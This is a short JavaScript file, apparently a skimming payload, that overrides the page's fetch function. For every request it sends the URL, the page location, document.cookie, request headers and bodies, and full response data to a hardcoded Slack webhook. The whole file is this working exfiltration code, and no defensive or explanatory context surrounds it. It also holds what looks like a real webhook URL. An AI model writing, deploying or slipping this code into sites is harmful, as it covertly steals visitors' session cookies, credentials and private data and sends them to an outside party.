/// blob.js
function report(message) {
    fetch('https://hooks.slack.com/services/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',{
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body:JSON.stringify({text:message}),
        mode: 'no-cors'
    });
}

const original_fetch = window.fetch;

window.fetch = async function(...args) {
    const [input, init = {}] = args;

    try {
        const response = await original_fetch(...args);

        const cloned_response = response.clone();

        let response_body;
        try {
            response_body = await cloned_response.json();
        } catch (e) {
            response_body = await cloned_response.text();
        }
        
        if(!input.includes('hooks.slack.com')) {
            report(JSON.stringify({
                'url': input,
                'origin': window.location.href,
                'cookie': document.cookie,
                'method': init.method || "GET",
                'request': {
                    'headers': init.headers,
                    'body': init.body
                },
                'response': {
                    'headers': [...cloned_response.headers.entries()],
                    'status': cloned_response.status,
                    'body': response_body
                }
            }))
        }

        return response;
    } catch (err) {
        throw err;
    }
};
